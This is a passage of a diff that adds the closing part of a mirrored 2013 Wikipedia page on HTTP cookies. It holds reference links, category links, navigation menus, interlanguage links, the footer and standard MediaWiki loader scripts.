+<li><a rel="nofollow" class="external text" href="http://support.mozilla.com/en-US/kb/Cookies">Mozilla Knowledgebase: Cookies</a></li>
+<li><a rel="nofollow" class="external text" href="http://blogs.avg.com/news-threats/avg-codeword-cookies/">AVG Blogs: What are Cookies</a></li>
+</ul>
+<p><span id="interwiki-ro-fa"></span></p>
+
+
+<!-- 
+NewPP limit report
+Preprocessor visited node count: 23462/1000000
+Preprocessor generated node count: 49710/1500000
+Post-expand include size: 124929/2048000 bytes
+Template argument size: 60049/2048000 bytes
+Highest expansion depth: 26/40
+Expensive parser function count: 4/500
+-->
+
+<!-- Saved in parser cache with key enwiki:pcache:idhash:5068415-0!*!0!!en!4!* and timestamp 20130213182829 -->
+</div>				<!-- /bodycontent -->
+								<!-- printfooter -->
+				<div class="printfooter">
+				Retrieved from "<a href="../../w/index-title=HTTP_cookie&oldid=538082318.php.html">http://en.wikipedia.org/w/index.php?title=HTTP_cookie&amp;oldid=538082318</a>"				</div>
+				<!-- /printfooter -->
+												<!-- catlinks -->
+				<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Help_Categories" title="Help:Categories">Categories</a>: <ul><li><a href="Category_Web_security_exploits" title="Category:Web security exploits">Web security exploits</a></li><li><a href="Category_HTTP" title="Category:HTTP">HTTP</a></li><li><a href="Category_HTTP_headers" title="Category:HTTP headers">HTTP headers</a></li><li><a href="Category_Internet_privacy" title="Category:Internet privacy">Internet privacy</a></li><li><a href="Category_Computer_access_control" title="Category:Computer access control">Computer access control</a></li></ul></div><div id="mw-hidden-catlinks" class="mw-hidden-catlinks mw-hidden-cats-hidden">Hidden categories: <ul><li><a href="Category_Articles_needing_additional_references_from_August_2011" title="Category:Articles needing additional references from August 2011">Articles needing additional references from August 2011</a></li><li><a href="Category_All_articles_needing_additional_references" title="Category:All articles needing additional references">All articles needing additional references</a></li><li><a href="Category_Articles_that_may_contain_original_research_from_September_2011" title="Category:Articles that may contain original research from September 2011">Articles that may contain original research from September 2011</a></li><li><a href="Category_All_articles_that_may_contain_original_research" title="Category:All articles that may contain original research">All articles that may contain original research</a></li><li><a href="Category_Articles_needing_additional_references_from_September_2011" title="Category:Articles needing additional references from September 2011">Articles needing additional references from September 2011</a></li><li><a href="Category_Wikipedia_articles_needing_clarification_from_August_2011" title="Category:Wikipedia articles needing clarification from August 2011">Wikipedia articles needing clarification from August 2011</a></li><li><a href="Category_Spoken_articles" title="Category:Spoken articles">Spoken articles</a></li><li><a href="Category_Articles_with_hAudio_microformats" title="Category:Articles with hAudio microformats">Articles with hAudio microformats</a></li><li><a href="Category_Wikipedia_articles_with_ASCII_art" title="Category:Wikipedia articles with ASCII art">Wikipedia articles with ASCII art</a></li></ul></div></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+				<!-- debughtml -->
+								<!-- /debughtml -->
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<div id="mw-navigation">
+			<h2>Navigation menu</h2>
+			<!-- header -->
+			<div id="mw-head" class="noprint">
+				
+<!-- 0 -->
+<div id="p-personal" role="navigation" class="">
+	<h3>Personal tools</h3>
+	<ul>
+<li id="pt-createaccount"><a href="../../w/index-title=Special_UserLogin&returnto=HTTP+cookie&type=signup.php.html">Create account</a></li><li id="pt-login"><a href="../../w/index-title=Special_UserLogin&returnto=HTTP+cookie.php.html" title="You are encouraged to log in; however, it is not mandatory. [o]" accesskey="o">Log in</a></li>	</ul>
+</div>
+
+<!-- /0 -->
+				<div id="left-navigation">
+					
+<!-- 0 -->
+<div id="p-namespaces" role="navigation" class="vectorTabs">
+	<h3>Namespaces</h3>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="index.html"  title="View the content page [c]" accesskey="c">Article</a></span></li>
+					<li  id="ca-talk"><span><a href="Talk_HTTP_cookie"  title="Discussion about the content page [t]" accesskey="t">Talk</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" role="navigation" class="vectorMenu emptyPortlet">
+	<h3 id="mw-vector-current-variant">
+		</h3>
+	<h3><span>Variants</span><a href="#"></a></h3>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+				</div>
+				<div id="right-navigation">
+					
+<!-- 0 -->
+<div id="p-views" role="navigation" class="vectorTabs">
+	<h3>Views</h3>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="index.html" >Read</a></span></li>
+					<li id="ca-edit"><span><a href="../../w/index-title=HTTP_cookie&action=edit.php.html"  title="You can edit this page. &#10;Please use the preview button before saving. [e]" accesskey="e">Edit</a></span></li>
+					<li id="ca-history" class="collapsible"><span><a href="../../w/index-title=HTTP_cookie&action=history.php.html"  title="Past versions of this page [h]" accesskey="h">View history</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" role="navigation" class="vectorMenu emptyPortlet">
+	<h3><span>Actions</span><a href="#"></a></h3>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search" role="search">
+	<h3><label for="searchInput">Search</label></h3>
+	<form action="/w/index.php" id="searchform">
+				<div id="simpleSearch">
+						<input name="search" title="Search Wikipedia [f]" accesskey="f" id="searchInput" />						<button type="submit" name="button" title="Search Wikipedia for this text" id="searchButton"><img src="http://bits.wikimedia.org/static-1.21wmf9/skins/vector/images/search-ltr.png?303-4" alt="Search" width="12" height="13" /></button>								<input type='hidden' name="title" value="Special:Search"/>
+		</div>
+	</form>
+</div>
+
+<!-- /2 -->
+				</div>
+			</div>
+			<!-- /header -->
+			<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo" role="banner"><a style="background-image: url(http://upload.wikimedia.org/wikipedia/en/b/bc/Wiki.png);" href="Main_Page"  title="Visit the main page"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" role="navigation" id='p-navigation'>
+	<h3>Navigation</h3>
+	<div class="body">
+		<ul>
+			<li id="n-mainpage-description"><a href="Main_Page" title="Visit the main page [z]" accesskey="z">Main page</a></li>
+			<li id="n-contents"><a href="Portal_Contents" title="Guides to browsing Wikipedia">Contents</a></li>
+			<li id="n-featuredcontent"><a href="Portal_Featured_content" title="Featured content – the best of Wikipedia">Featured content</a></li>
+			<li id="n-currentevents"><a href="Portal_Current_events" title="Find background information on current events">Current events</a></li>
+			<li id="n-randompage"><a href="Special_Random" title="Load a random article [x]" accesskey="x">Random article</a></li>
+			<li id="n-sitesupport"><a href="http://donate.wikimedia.org/wiki/Special:FundraiserRedirector?utm_source=donate&utm_medium=sidebar&utm_campaign=C13_en.wikipedia.org&uselang=en" title="Support us">Donate to Wikipedia</a></li>
+		</ul>
+	</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- interaction -->
+<div class="portal" role="navigation" id='p-interaction'>
+	<h3>Interaction</h3>
+	<div class="body">
+		<ul>
+			<li id="n-help"><a href="Help_Contents" title="Guidance on how to use and edit Wikipedia">Help</a></li>
+			<li id="n-aboutsite"><a href="Wikipedia_About" title="Find out about Wikipedia">About Wikipedia</a></li>
+			<li id="n-portal"><a href="Wikipedia_Community_portal" title="About the project, what you can do, where to find things">Community portal</a></li>
+			<li id="n-recentchanges"><a href="Special_RecentChanges" title="A list of recent changes in the wiki [r]" accesskey="r">Recent changes</a></li>
+			<li id="n-contact"><a href="Wikipedia_Contact_us" title="How to contact Wikipedia">Contact Wikipedia</a></li>
+		</ul>
+	</div>
+</div>
+
+<!-- /interaction -->
+
+<!-- TOOLBOX -->
+<div class="portal" role="navigation" id='p-tb'>
+	<h3>Toolbox</h3>
+	<div class="body">
+		<ul>
+			<li id="t-whatlinkshere"><a href="Special_WhatLinksHere/HTTP_cookie" title="List of all English Wikipedia pages containing links to this page [j]" accesskey="j">What links here</a></li>
+			<li id="t-recentchangeslinked"><a href="Special_RecentChangesLinked/HTTP_cookie" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
+			<li id="t-upload"><a href="Wikipedia_File_Upload_Wizard" title="Upload files [u]" accesskey="u">Upload file</a></li>
+			<li id="t-specialpages"><a href="Special_SpecialPages" title="A list of all special pages [q]" accesskey="q">Special pages</a></li>
+			<li id="t-permalink"><a href="../../w/index-title=HTTP_cookie&oldid=538082318.php.html" title="Permanent link to this revision of the page">Permanent link</a></li>
+			<li id="t-info"><a href="../../w/index-title=HTTP_cookie&action=info.php.html">Page information</a></li>
+<li id="t-cite"><a href="../../w/index-title=Special_Cite&page=HTTP_cookie&id=538082318.php.html" title="Information on how to cite this page">Cite this page</a></li>		</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- coll-print_export -->
+<div class="portal" role="navigation" id='p-coll-print_export'>
+	<h3>Print/export</h3>
+	<div class="body">
+		<ul id="collectionPortletList"><li id="coll-create_a_book"><a href="../../w/index-title=Special_Book&bookcmd=book_creator&referer=HTTP+cookie.php.html" title="Create a book or page collection" rel="nofollow">Create a book</a></li><li id="coll-download-as-rl"><a href="../../w/index-title=Special_Book&bookcmd=render_article&arttitle=HTTP+cookie&oldid=538082318&writer=rl.php.html" title="Download a PDF version of this wiki page" rel="nofollow">Download as PDF</a></li><li id="t-print"><a href="../../w/index-title=HTTP_cookie&printable=yes.php.html" title="Printable version of this page [p]" accesskey="p">Printable version</a></li></ul>	</div>
+</div>
+
+<!-- /coll-print_export -->
+
+<!-- LANGUAGES -->
+<div class="portal" role="navigation" id='p-lang'>
+	<h3>Languages</h3>
+	<div class="body">
+		<ul>
+			<li class="interwiki-af"><a href="http://af.wikipedia.org/wiki/Koekie_(rekenaarwetenskap)" title="Koekie (rekenaarwetenskap)" lang="af" hreflang="af">Afrikaans</a></li>
+			<li class="interwiki-als"><a href="http://als.wikipedia.org/wiki/Cookie" title="Cookie" lang="als" hreflang="als">Alemannisch</a></li>
+			<li class="interwiki-ar"><a href="http://ar.wikipedia.org/wiki/%D8%A5%D8%AA%D8%B4_%D8%AA%D9%8A_%D8%AA%D9%8A_%D8%A8%D9%8A_%D9%83%D9%88%D9%83%D9%8A" title="إتش تي تي بي كوكي" lang="ar" hreflang="ar">العربية</a></li>
+			<li class="interwiki-ba"><a href="http://ba.wikipedia.org/wiki/Cookie" title="Cookie" lang="ba" hreflang="ba">Башҡортса</a></li>
+			<li class="interwiki-bg"><a href="http://bg.wikipedia.org/wiki/HTTP-%D0%B1%D0%B8%D1%81%D0%BA%D0%B2%D0%B8%D1%82%D0%BA%D0%B0" title="HTTP-бисквитка" lang="bg" hreflang="bg">Български</a></li>
+			<li class="interwiki-ca"><a href="http://ca.wikipedia.org/wiki/Galeta_(inform%C3%A0tica)" title="Galeta (informàtica)" lang="ca" hreflang="ca">Català</a></li>
+			<li class="interwiki-cs"><a href="http://cs.wikipedia.org/wiki/HTTP_cookie" title="HTTP cookie" lang="cs" hreflang="cs">Česky</a></li>
+			<li class="interwiki-da"><a href="http://da.wikipedia.org/wiki/Cookie" title="Cookie" lang="da" hreflang="da">Dansk</a></li>
+			<li class="interwiki-de"><a href="http://de.wikipedia.org/wiki/HTTP-Cookie" title="HTTP-Cookie" lang="de" hreflang="de">Deutsch</a></li>
+			<li class="interwiki-et"><a href="http://et.wikipedia.org/wiki/HTTP-k%C3%BCpsis" title="HTTP-küpsis" lang="et" hreflang="et">Eesti</a></li>
+			<li class="interwiki-el"><a href="http://el.wikipedia.org/wiki/HTTP_cookies" title="HTTP cookies" lang="el" hreflang="el">Ελληνικά</a></li>
+			<li class="interwiki-es"><a href="http://es.wikipedia.org/wiki/Cookie_(inform%C3%A1tica)" title="Cookie (informática)" lang="es" hreflang="es">Español</a></li>
+			<li class="interwiki-eo"><a href="http://eo.wikipedia.org/wiki/Kuketo" title="Kuketo" lang="eo" hreflang="eo">Esperanto</a></li>
+			<li class="interwiki-eu"><a href="http://eu.wikipedia.org/wiki/Cookie" title="Cookie" lang="eu" hreflang="eu">Euskara</a></li>
+			<li class="interwiki-fa"><a href="http://fa.wikipedia.org/wiki/%DA%A9%D9%88%DA%A9%DB%8C_%D8%A7%DA%86%E2%80%8C%D8%AA%DB%8C%E2%80%8C%D8%AA%DB%8C%E2%80%8C%D9%BE%DB%8C" title="کوکی اچ‌تی‌تی‌پی" lang="fa" hreflang="fa">فارسی</a></li>
+			<li class="interwiki-fr"><a href="http://fr.wikipedia.org/wiki/Cookie_(informatique)" title="Cookie (informatique)" lang="fr" hreflang="fr">Français</a></li>
+			<li class="interwiki-gl"><a href="http://gl.wikipedia.org/wiki/Cookie" title="Cookie" lang="gl" hreflang="gl">Galego</a></li>
+			<li class="interwiki-ko"><a href="http://ko.wikipedia.org/wiki/HTTP_%EC%BF%A0%ED%82%A4" title="HTTP 쿠키" lang="ko" hreflang="ko">한국어</a></li>
+			<li class="interwiki-id"><a href="http://id.wikipedia.org/wiki/Kuki_HTTP" title="Kuki HTTP" lang="id" hreflang="id">Bahasa Indonesia</a></li>
+			<li class="interwiki-is"><a href="http://is.wikipedia.org/wiki/Kaka_(t%C3%B6lvunarfr%C3%A6%C3%B0i)" title="Kaka (tölvunarfræði)" lang="is" hreflang="is">Íslenska</a></li>
+			<li class="interwiki-it"><a href="http://it.wikipedia.org/wiki/Cookie" title="Cookie" lang="it" hreflang="it">Italiano</a></li>
+			<li class="interwiki-he"><a href="http://he.wikipedia.org/wiki/%D7%A2%D7%95%D7%92%D7%99%D7%99%D7%94_(%D7%90%D7%99%D7%A0%D7%98%D7%A8%D7%A0%D7%98)" title="עוגייה (אינטרנט)" lang="he" hreflang="he">עברית</a></li>
+			<li class="interwiki-sw"><a href="http://sw.wikipedia.org/wiki/Kuki" title="Kuki" lang="sw" hreflang="sw">Kiswahili</a></li>
+			<li class="interwiki-lv"><a href="http://lv.wikipedia.org/wiki/S%C4%ABkdatne" title="Sīkdatne" lang="lv" hreflang="lv">Latviešu</a></li>
+			<li class="interwiki-li"><a href="http://li.wikipedia.org/wiki/Cookie" title="Cookie" lang="li" hreflang="li">Limburgs</a></li>
+			<li class="interwiki-hu"><a href="http://hu.wikipedia.org/wiki/HTTP-s%C3%BCti" title="HTTP-süti" lang="hu" hreflang="hu">Magyar</a></li>
+			<li class="interwiki-mr"><a href="http://mr.wikipedia.org/wiki/%E0%A4%B8%E0%A5%8D%E0%A4%AE%E0%A5%83%E0%A4%A4%E0%A5%80%E0%A4%B6%E0%A5%87%E0%A4%B7" title="स्मृतीशेष" lang="mr" hreflang="mr">मराठी</a></li>
+			<li class="interwiki-nl"><a href="http://nl.wikipedia.org/wiki/Cookie_(internet)" title="Cookie (internet)" lang="nl" hreflang="nl">Nederlands</a></li>
+			<li class="interwiki-nds-nl"><a href="http://nds-nl.wikipedia.org/wiki/Koekien_(internet)" title="Koekien (internet)" lang="nds-nl" hreflang="nds-nl">Nedersaksies</a></li>
+			<li class="interwiki-ja"><a href="http://ja.wikipedia.org/wiki/HTTP_cookie" title="HTTP cookie" lang="ja" hreflang="ja">日本語</a></li>
+			<li class="interwiki-no"><a href="http://no.wikipedia.org/wiki/Informasjonskapsel" title="Informasjonskapsel" lang="no" hreflang="no">Norsk (bokmål)‎</a></li>
+			<li class="interwiki-pl"><a href="http://pl.wikipedia.org/wiki/Ciasteczko" title="Ciasteczko" lang="pl" hreflang="pl">Polski</a></li>
+			<li class="interwiki-pt"><a href="http://pt.wikipedia.org/wiki/Cookie" title="Cookie" lang="pt" hreflang="pt">Português</a></li>
+			<li class="interwiki-ro"><a href="http://ro.wikipedia.org/wiki/Cookie" title="Cookie" lang="ro" hreflang="ro">Română</a></li>
+			<li class="interwiki-ru"><a href="http://ru.wikipedia.org/wiki/HTTP_cookie" title="HTTP cookie" lang="ru" hreflang="ru">Русский</a></li>
+			<li class="interwiki-simple"><a href="http://simple.wikipedia.org/wiki/HTTP_cookie" title="HTTP cookie" lang="simple" hreflang="simple">Simple English</a></li>
+			<li class="interwiki-sh"><a href="http://sh.wikipedia.org/wiki/Cookie" title="Cookie" lang="sh" hreflang="sh">Srpskohrvatski / српскохрватски</a></li>
+			<li class="interwiki-fi"><a href="http://fi.wikipedia.org/wiki/Ev%C3%A4ste" title="Eväste" lang="fi" hreflang="fi">Suomi</a></li>
+			<li class="interwiki-sv"><a href="http://sv.wikipedia.org/wiki/Cookie" title="Cookie" lang="sv" hreflang="sv">Svenska</a></li>
+			<li class="interwiki-th"><a href="http://th.wikipedia.org/wiki/%E0%B9%80%E0%B8%AD%E0%B8%8A%E0%B8%97%E0%B8%B5%E0%B8%97%E0%B8%B5%E0%B8%9E%E0%B8%B5%E0%B8%84%E0%B8%B8%E0%B8%81%E0%B8%81%E0%B8%B5%E0%B9%89" title="เอชทีทีพีคุกกี้" lang="th" hreflang="th">ไทย</a></li>
+			<li class="interwiki-tr"><a href="http://tr.wikipedia.org/wiki/%C3%87erez_(internet)" title="Çerez (internet)" lang="tr" hreflang="tr">Türkçe</a></li>
+			<li class="interwiki-uk"><a href="http://uk.wikipedia.org/wiki/%D0%9A%D1%83%D0%BA%D0%B8" title="Куки" lang="uk" hreflang="uk">Українська</a></li>
+			<li class="interwiki-vi"><a href="http://vi.wikipedia.org/wiki/Cookie" title="Cookie" lang="vi" hreflang="vi">Tiếng Việt</a></li>
+			<li class="interwiki-yi"><a href="http://yi.wikipedia.org/wiki/%D7%A7%D7%95%D7%A7%D7%99" title="קוקי" lang="yi" hreflang="yi">ייִדיש</a></li>
+			<li class="interwiki-zh-yue"><a href="http://zh-yue.wikipedia.org/wiki/HTTP%E6%9B%B2%E5%A5%87" title="HTTP曲奇" lang="zh-yue" hreflang="zh-yue">粵語</a></li>
+			<li class="interwiki-zh"><a href="http://zh.wikipedia.org/wiki/Cookie" title="Cookie" lang="zh" hreflang="zh">中文</a></li>
+		</ul>
+	</div>
+</div>
+
+<!-- /LANGUAGES -->
+			</div>
+			<!-- /panel -->
+		</div>
+		<!-- footer -->
+		<div id="footer" role="contentinfo">
+							<ul id="footer-info">
+											<li id="footer-info-lastmod"> This page was last modified on 13 February 2013 at 18:28.<br /></li>
+											<li id="footer-info-copyright">Text is available under the <a rel="license" href="../Wikipedia_Text_of_Creative_Commons_Attribution-ShareAlike_3.0_Unported_License">Creative Commons Attribution-ShareAlike License</a><a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/" style="display:none;"></a>;
+additional terms may apply.
+See <a href="http://wikimediafoundation.org/wiki/Terms_of_Use">Terms of Use</a> for details.<br/>
+Wikipedia® is a registered trademark of the <a href="http://www.wikimediafoundation.org/">Wikimedia Foundation, Inc.</a>, a non-profit organization.<br /></li><li class="noprint"><a class='internal' href="Wikipedia_Contact_us">Contact us</a></li>
+									</ul>
+							<ul id="footer-places">
+											<li id="footer-places-privacy"><a href="http://wikimediafoundation.org/wiki/Privacy_policy" title="wikimedia:Privacy policy">Privacy policy</a></li>
+											<li id="footer-places-about"><a href="Wikipedia_About" title="Wikipedia:About">About Wikipedia</a></li>
+											<li id="footer-places-disclaimer"><a href="Wikipedia_General_disclaimer" title="Wikipedia:General disclaimer">Disclaimers</a></li>
+											<li id="footer-places-mobileview"><a href="http://en.m.wikipedia.org/wiki/HTTP_cookie" class="noprint stopMobileRedirectToggle">Mobile view</a></li>
+									</ul>
+										<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://wikimediafoundation.org/"><img src="http://bits.wikimedia.org/images/wikimedia-button.png" width="88" height="31" alt="Wikimedia Foundation"/></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="http://bits.wikimedia.org/static-1.21wmf9/skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		<script>if(window.mw){
+mw.loader.state({"site":"loading","user":"ready","user.groups":"ready"});
+}</script>
+<script src="http://bits.wikimedia.org/en.wikipedia.org/load.php?debug=false&lang=en&modules=skins.vector&only=scripts&skin=vector&*"></script>
+<script>if(window.mw){
+mw.loader.load(["mw.PopUpMediaTransform","mobile.desktop","mediawiki.user","mediawiki.page.ready","mediawiki.searchSuggest","mediawiki.hidpi","ext.gadget.teahouse","ext.gadget.ReferenceTooltips","ext.gadget.DRN-wizard","ext.gadget.charinsert","mw.MwEmbedSupport.style","ext.vector.collapsibleNav","ext.vector.collapsibleTabs","ext.vector.editWarning","ext.UserBuckets","ext.articleFeedback.startup","ext.articleFeedbackv5.startup","ext.markAsHelpful","ext.Experiments.experiments"], null, true);
+}</script>
+<script src="../../w/index-title=MediaWiki_Gadget-ReferenceTooltips.js&action=raw&ctype=text_javascript&508635914.php.html"></script>
+<script src="http://bits.wikimedia.org/en.wikipedia.org/load.php?debug=false&lang=en&modules=site&only=scripts&skin=vector&*"></script>
+<!-- Served by mw1068 in 0.145 secs. -->
+	</body>
+</html>
+
+<!-- Localized -->
